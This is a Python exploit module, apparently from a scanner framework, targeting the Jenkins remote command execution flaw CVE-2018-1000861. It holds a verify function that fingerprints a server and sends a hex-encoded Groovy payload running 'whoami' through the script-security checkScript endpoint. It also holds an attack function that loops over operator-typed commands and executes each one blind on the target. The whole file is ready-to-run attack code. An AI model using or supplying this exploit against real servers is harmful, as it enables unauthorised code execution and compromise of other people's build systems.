import requests
import re
import urllib
import binascii

def verify(url):
    relsult = {
        'name': 'Jenkins远程命令执行漏洞(CVE-2018-1000861)',
        'vulnerable': False,
        'attack': True,
    }
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        endpoint = '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
        cmd = 'whoami'
        payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.hexlify(cmd.encode('utf-8')).decode('utf-8')
        params = {
            'sandbox': True,
            'value': payload
        }
        req = requests.get(url, headers=headers, timeout=4)
        if re.search('Jenkins', str(req.headers)) and re.search('adjuncts', req.text) and req.status_code == 200:
            vurl = urllib.parse.urljoin(url, endpoint)
            rep2 = requests.get(vurl, headers=headers, timeout=5)
            if rep2.status_code != 404:
                rep3 = requests.get(vurl, params=params, headers=headers, timeout=5)
                if rep3.status_code == 200:
                    relsult['vulnerable'] = True
                    relsult['url'] = url
                    relsult['about'] = 'https://github.com/orangetw/awesome-jenkins-rce-2019/blob/master/exp.py'
        return relsult
    except:
        return relsult


def attack(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        endpoint = '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
        cmd = ''
        print('[+] 开始执行命令, 输入exit退出!')
        while cmd != 'exit':
            cmd = input('[+] 执行命令(无回显) >')
            payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.hexlify(cmd.encode('utf-8')).decode('utf-8')
            params = {
                'sandbox': True,
                'value': payload
            }
            vurl = urllib.parse.urljoin(url, endpoint)
            rep3 = requests.get(vurl, params=params, headers=headers, timeout=10)
            if rep3.status_code == 200:
                print('[*] 命令执行成功，请用dnslog验证!')
            else:
                print('[-] 未知错误，请到dnslog检查是否有回显?')
        return True
    except:
        return False